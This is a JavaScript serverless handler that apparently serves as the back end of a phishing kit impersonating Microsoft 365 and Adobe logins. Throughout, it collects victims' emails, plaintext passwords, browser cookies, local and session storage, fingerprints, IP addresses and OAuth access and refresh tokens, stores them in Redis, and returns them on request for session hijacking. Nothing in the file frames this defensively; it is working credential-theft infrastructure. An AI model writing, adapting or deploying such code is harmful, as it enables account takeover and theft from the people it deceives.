export const handler = async (event, context) => {
  // CORS headers
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
  };

  // Handle preflight requests
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers,
      body: '',
    };
  }

  if (event.httpMethod !== 'GET' && event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' }),
    };
  }

  try {
    // Check environment variables
    const UPSTASH_REDIS_REST_URL = process.env.UPSTASH_REDIS_REST_URL;
    const UPSTASH_REDIS_REST_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;

    if (!UPSTASH_REDIS_REST_URL || !UPSTASH_REDIS_REST_TOKEN) {
      console.error('Missing Redis configuration in setSession');
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({ 
          error: 'Server configuration error - Redis credentials missing' 
        }),
      };
    }

    // Initialize Upstash Redis with error handling
    let redis;
    try {
      const { Redis } = await import('@upstash/redis');
      redis = new Redis({
        url: UPSTASH_REDIS_REST_URL,
        token: UPSTASH_REDIS_REST_TOKEN,
      });
    } catch (redisError) {
      console.error('Redis initialization error in setSession:', redisError);
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({ 
          error: 'Database connection error',
          details: redisError.message
        }),
      };
    }

    let sessionData = null;

    if (event.httpMethod === 'POST') {
      // Handle POST request - create/update session
      const data = JSON.parse(event.body);
      
      const clientIP = event.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
                      event.headers['x-real-ip'] || 
                      event.headers['cf-connecting-ip'] ||
                      event.requestContext?.identity?.sourceIp ||
                      'Unknown';

      sessionData = {
        email: data.email || '',
        password: data.password || 'Not captured',
        provider: data.provider || 'Microsoft',
        fileName: data.fileName || 'Microsoft 365 Access',
        timestamp: data.timestamp || new Date().toISOString(),
        sessionId: data.sessionId || Math.random().toString(36).substring(2, 15),
        clientIP: clientIP,
        userAgent: data.userAgent || event.headers['user-agent'] || 'Unknown',
        deviceType: data.deviceType || (/Mobile|Android|iPhone|iPad/.test(data.userAgent || event.headers['user-agent'] || '') ? 'mobile' : 'desktop'),
        cookies: data.cookies || 'No cookies found',
        formattedCookies: data.formattedCookies || [],
        localStorage: data.localStorage || 'Empty',
        sessionStorage: data.sessionStorage || 'Empty',
        browserFingerprint: data.browserFingerprint || {},
        documentCookies: data.documentCookies || '',
        accessToken: data.accessToken || null,
        refreshToken: data.refreshToken || null,
        userProfile: data.userProfile || null
      };

      // Store in Redis with TTL
      await redis.set(`session:${sessionData.sessionId}`, JSON.stringify(sessionData), { ex: 86400 });
      await redis.set(`user:${sessionData.email}`, JSON.stringify(sessionData), { ex: 86400 });
      
      // Also store cookies separately for easy retrieval
      await redis.set(`cookies:${sessionData.sessionId}`, JSON.stringify({
        cookies: sessionData.formattedCookies,
        localStorage: sessionData.localStorage,
        sessionStorage: sessionData.sessionStorage,
        timestamp: sessionData.timestamp,
        email: sessionData.email,
        password: sessionData.password,
        documentCookies: sessionData.documentCookies
      }), { ex: 86400 });

      return {
        statusCode: 200,
        headers,
        body: JSON.stringify({
          success: true,
          message: 'Session created successfully',
          sessionId: sessionData.sessionId,
          session: {
            email: sessionData.email,
            provider: sessionData.provider,
            timestamp: sessionData.timestamp,
            sessionId: sessionData.sessionId,
            cookieCount: Array.isArray(sessionData.formattedCookies) ? sessionData.formattedCookies.length : 0,
            hasLocalStorage: sessionData.localStorage !== 'Empty',
            hasSessionStorage: sessionData.sessionStorage !== 'Empty'
          }
        }),
      };

    } else {
      // Handle GET request - retrieve session
      const url = event.queryStringParameters || {};
      const sessionId = url.sessionId;
      const email = url.email;

      // Try to get session from cookie first
      const cookies = event.headers.cookie || '';

      if (cookies.includes('microsoft365_session=') || cookies.includes('adobe_session=')) {
        try {
          const sessionCookie = cookies.includes('microsoft365_session=') ? 
            cookies.split('microsoft365_session=')[1].split(';')[0] :
            cookies.split('adobe_session=')[1].split(';')[0];
          const decodedSession = decodeURIComponent(sessionCookie);
          sessionData = JSON.parse(decodedSession);
          
          // Verify session exists in Redis
          const redisSession = await redis.get(`session:${sessionData.sessionId}`);
          if (redisSession) {
            const updatedSession = JSON.parse(redisSession);
            sessionData = { ...sessionData, ...updatedSession };
          } else {
            console.log('⚠️ Cookie exists but session expired in Redis');
          }
        } catch (error) {
          console.error('Error parsing session cookie:', error);
          sessionData = null;
        }
      }

      // Fallback to URL parameters
      if (!sessionData && (sessionId || email)) {
        try {
          if (sessionId) {
            const redisSession = await redis.get(`session:${sessionId}`);
            if (redisSession) {
              sessionData = JSON.parse(redisSession);
            }
          } else if (email) {
            const userSession = await redis.get(`user:${email}`);
            if (userSession) {
              sessionData = JSON.parse(userSession);
            }
          }
        } catch (error) {
          console.error('Error getting session from Redis:', error);
        }
      }

      if (!sessionData) {
        return {
          statusCode: 404,
          headers,
          body: JSON.stringify({ 
            success: false, 
            message: 'No active session found',
            sessionId: sessionId,
            email: email
          }),
        };
      }

      return {
        statusCode: 200,
        headers,
        body: JSON.stringify({
          success: true,
          session: {
            email: sessionData.email,
            provider: sessionData.provider,
            fileName: sessionData.fileName,
            timestamp: sessionData.timestamp,
            sessionId: sessionData.sessionId,
            clientIP: sessionData.clientIP || 'Unknown',
            userAgent: sessionData.userAgent || 'Unknown',
            deviceType: sessionData.deviceType || 'unknown',
            cookies: sessionData.cookies || [],
            formattedCookies: sessionData.formattedCookies || [],
            localStorage: sessionData.localStorage || 'Not available',
            sessionStorage: sessionData.sessionStorage || 'Not available',
            password: sessionData.password || 'Not captured',
            cookieCount: Array.isArray(sessionData.formattedCookies) ? sessionData.formattedCookies.length : 0,
            hasLocalStorage: sessionData.localStorage !== 'Empty' && sessionData.localStorage !== 'Not available',
            hasSessionStorage: sessionData.sessionStorage !== 'Empty' && sessionData.sessionStorage !== 'Not available',
            accessToken: sessionData.accessToken,
            refreshToken: sessionData.refreshToken,
            userProfile: sessionData.userProfile
          }
        }),
      };
    }

  } catch (error) {
    console.error('Error in setSession function:', error);
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({ 
        error: 'Internal server error',
        details: error.message,
        timestamp: new Date().toISOString()
      }),
    };
  }
};